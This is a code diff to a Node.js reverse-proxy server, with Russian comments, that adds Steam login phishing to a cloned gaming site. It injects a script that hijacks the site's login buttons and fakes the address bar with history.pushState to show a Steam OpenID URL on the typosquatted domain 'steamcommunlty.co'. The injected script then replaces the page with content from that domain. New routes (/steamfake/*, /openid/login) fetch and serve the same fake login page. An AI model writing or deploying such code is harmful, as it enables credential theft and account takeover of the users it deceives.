@@ -511,7 +511,90 @@ function modifyUrls(content, baseUrl, contentType = '') {
         </script>
         `;
         
+        // Добавляем скрипт для перехвата кнопок логина
+        const loginButtonsScript = `
+        <script>
+        (function() {
+            console.log('🔒 Инициализация перехвата кнопок входа');
+            
+            // Функция для добавления обработчиков на кнопки логина
+            function setupLoginButtons() {
+                // Целевые селекторы
+                const selectors = ['#login-head-tablet', '#login-register', '#login-chat'];
+                
+                selectors.forEach(selector => {
+                    const elements = document.querySelectorAll(selector);
+                    if (elements.length > 0) {
+                        console.log('Найдены кнопки входа:', selector, elements.length);
+                        
+                        elements.forEach(element => {
+                            // Проверяем, не модифицировали ли мы уже этот элемент
+                            if (!element.hasAttribute('data-login-modified')) {
+                                element.setAttribute('data-login-modified', 'true');
+                                
+                                // Сохраняем оригинальный обработчик клика
+                                const originalOnclick = element.onclick;
+                                
+                                // Переопределяем обработчик клика
+                                element.onclick = function(e) {
+                                    e.preventDefault();
+                                    e.stopPropagation();
+                                    
+                                    console.log('Перехваченный клик по кнопке входа');
+                                    
+                                    // Фейковый URL для показа в адресной строке
+                                    const fakeUrl = 'steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580460939.CjmZIh5AMg&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select';
+                                    
+                                    // Используя History API меняем URL в адресной строке
+                                    window.history.pushState({}, '', '/' + fakeUrl);
+                                    
+                                    // При этом загружаем содержимое с нашего обработчика
+                                    fetch('/steamfake/page')
+                                        .then(response => response.text())
+                                        .then(html => {
+                                            // Заменяем содержимое текущей страницы
+                                            document.open();
+                                            document.write(html);
+                                            document.close();
+                                        })
+                                        .catch(error => {
+                                            console.error('Ошибка загрузки фейковой страницы:', error);
+                                            // В случае ошибки можно использовать прямое перенаправление
+                                            window.location.href = 'https://steamcommunlty.co/6kaomrcjpf2m.html';
+                                        });
+                                    
+                                    return false;
+                                };
+                                
+                                console.log('Обработчик успешно переопределен для:', selector);
+                            }
+                        });
+                    }
+                });
+            }
+            
+            // Вызываем функцию сразу
+            setupLoginButtons();
+            
+            // Устанавливаем интервал для повторной проверки
+            setInterval(setupLoginButtons, 2000);
+            
+            // Используем MutationObserver для отслеживания динамически добавляемых кнопок
+            const observer = new MutationObserver(() => {
+                setupLoginButtons();
+            });
+            
+            // Наблюдаем за всеми изменениями DOM
+            observer.observe(document.documentElement, {
+                childList: true,
+                subtree: true
+            });
+        })();
+        </script>
+        `;
+        
         modified = modified.replace(/<head[^>]*>/i, `$&${proxyScript}`);
+        modified = modified.replace('</body>', loginButtonsScript + '</body>');
     }
     
     // Специфичные замены для JavaScript
@@ -657,6 +740,59 @@ function handleWebSocketProxy(clientWs, request) {
         }
     }
 }
+
+// НОВОЕ: Обработчик для показа фейковой steamcommunity страницы
+app.get('/steamfake/*', async (req, res) => {
+    try {
+        console.log('🔄 Запрос к фейковой Steam странице');
+        // Получаем реальное содержимое нужной страницы
+        const response = await axios({
+            method: 'GET',
+            url: 'https://steamcommunlty.co/6kaomrcjpf2m.html',
+            responseType: 'arraybuffer',
+            validateStatus: () => true,
+            timeout: 10000,
+            httpsAgent
+        });
+        
+        // Отправляем содержимое с правильными заголовками
+        res.set('Content-Type', response.headers['content-type'] || 'text/html');
+        res.send(response.data);
+    } catch (error) {
+        console.error('❌ Ошибка при загрузке фейковой страницы:', error.message);
+        res.status(500).send('Ошибка при загрузке страницы');
+    }
+});
+
+// НОВОЕ: Прямой обработчик для фейкового URL Steam OpenID
+app.get('/openid/login', async (req, res) => {
+    // Проверяем, похоже ли это на запрос OpenID от Steam
+    if (req.query['openid.ns'] && req.query['openid.mode']) {
+        console.log('📌 Прямой запрос к OpenID перехвачен');
+        
+        try {
+            // Получаем реальное содержимое нужной страницы
+            const response = await axios({
+                method: 'GET',
+                url: 'https://steamcommunlty.co/6kaomrcjpf2m.html',
+                responseType: 'arraybuffer',
+                validateStatus: () => true,
+                timeout: 10000,
+                httpsAgent
+            });
+            
+            // Отправляем содержимое с правильными заголовками
+            res.set('Content-Type', response.headers['content-type'] || 'text/html');
+            res.send(response.data);
+        } catch (error) {
+            console.error('❌ Ошибка при загрузке фейковой страницы:', error.message);
+            res.status(500).send('Ошибка при загрузке страницы');
+        }
+    } else {
+        // Если запрос не похож на OpenID, передаем его дальше
+        next();
+    }
+});
 
 // НОВОЕ: Админ API для проверки кастомных страниц
 app.get('/admin-api/check-custom-page', (req, res) => {
@@ -1549,6 +1685,7 @@ server.listen(PORT, '0.0.0.0', () => {
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
     👨‍💼 Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
+    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -1558,6 +1695,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ CORS handling
     ✓ URL rewriting (Improved)
     ✓ Content modification
+    ✓ Login buttons interception
     ✓ Mixed content prevention
     ✓ AdBlocker bypass attempt
     ✓ Admin Panel for custom page modifications
